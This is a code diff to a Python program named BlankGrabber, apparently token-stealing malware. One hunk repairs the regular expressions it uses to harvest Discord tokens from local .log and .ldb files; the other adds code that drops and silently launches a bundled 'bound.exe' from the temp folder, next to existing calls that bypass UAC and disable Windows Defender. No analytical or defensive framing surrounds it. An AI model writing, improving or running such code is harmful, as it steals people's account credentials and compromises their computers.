@@ -445,7 +445,7 @@ class BlankGrabber:
                 if not filename.endswith((".log", ".ldb")):
                     continue
                 for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
-                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"[\w]{24}\.[\w]{6}\.[\w]{40}", r"([\w]{26}\.[\w]{6}\.[\w]{38}"):
+                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"[\w]{24}\.[\w]{6}\.[\w]{40}", r"[\w]{26}\.[\w]{6}\.[\w]{38}"):
                         for token in re.findall(reg, line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
@@ -558,6 +558,10 @@ class BlankGrabber:
 if __name__ == "__main__":
     if not is_admin():
         uac_bypass()
+    if os.path.isfile(boundfile := os.path.join(sys._MEIPASS, "bound.exe")):
+        shutil.copy(boundfile, boundfile := os.path.join(os.getenv("temp"), f"{generate()}.exe"))
+        #subprocess.Popen(f"\"{boundfile}\" && del \"{boundfile}\"", creationflags= (subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE), shell= True)
+        os.startfile(boundfile) # Does not auto delete the file after execution (will add it in future)
     t = threading.Thread(target= disable_wd)
     t.start()
     time.sleep(1)
